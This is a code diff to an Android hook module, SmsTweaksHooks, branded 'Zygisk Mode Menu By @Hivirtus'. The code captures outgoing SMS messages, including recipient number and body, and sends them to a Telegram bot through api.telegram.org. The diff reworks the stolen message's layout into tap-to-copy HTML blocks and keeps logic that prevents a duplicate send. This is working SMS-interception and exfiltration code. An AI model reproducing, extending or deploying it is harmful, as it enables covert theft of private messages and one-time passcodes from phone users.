@@ -595,25 +595,18 @@ public final class SmsTweaksHooks {
                     if (digits.length() == 10) displayTo = "+91" + digits;
                     else if (digits.length() == 12 && digits.startsWith("91"))
                         displayTo = "+" + digits;
-                    // Exact screenshot format + Number / SMS / One-tap copy buttons
-                    String msg = "📱 SMS Intercepted Zygisk Mode\n"
-                            + "Menu By @Hivirtus 🔥 --------------------\n"
-                            + "📞 To: " + displayTo + "\n"
-                            + "💬 Message:\n"
-                            + body;
-                    String oneTap = "To: " + displayTo + "\nMessage: " + body;
+                    // Screenshot format: HTML <code> = Telegram tap-to-copy
+                    String msg = "📱 Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥\n"
+                            + "\n"
+                            + "To (Tap to copy):\n"
+                            + "<code>" + escHtml(displayTo) + "</code>\n"
+                            + "\n"
+                            + "Body (Tap to copy):\n"
+                            + "<code>" + escHtml(body) + "</code>";
                     String payload = "{\"chat_id\":\"" + jsonEscTg(chat)
                             + "\",\"text\":\"" + jsonEscTg(msg)
-                            + "\",\"disable_web_page_preview\":true"
-                            + ",\"reply_markup\":{\"inline_keyboard\":[["
-                            + "{\"text\":\"📞 Number copy\",\"copy_text\":{\"text\":\""
-                            + jsonEscTg(displayTo) + "\"}},"
-                            + "{\"text\":\"💬 SMS copy\",\"copy_text\":{\"text\":\""
-                            + jsonEscTg(body) + "\"}}"
-                            + "],["
-                            + "{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\""
-                            + jsonEscTg(oneTap) + "\"}}"
-                            + "]]}}";
+                            + "\",\"parse_mode\":\"HTML\""
+                            + ",\"disable_web_page_preview\":true}";
                     String url = "https://api.telegram.org/bot" + token + "/sendMessage";
                     HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                     c.setConnectTimeout(5000);
@@ -629,7 +622,7 @@ public final class SmsTweaksHooks {
                     status("tg_sent|" + to + "|http=" + code);
                     writeAll("hivirtus_tg_last_response.txt", "java_http=" + code + "\n");
                     if (code >= 200 && code < 300) {
-                        // Stop service.sh double-send — format already has buttons
+                        // Stop service.sh double-send
                         try {
                             FileOutputStream fos = new FileOutputStream(
                                     "/data/local/tmp/hivirtus_tg_inproc_sent.flag");
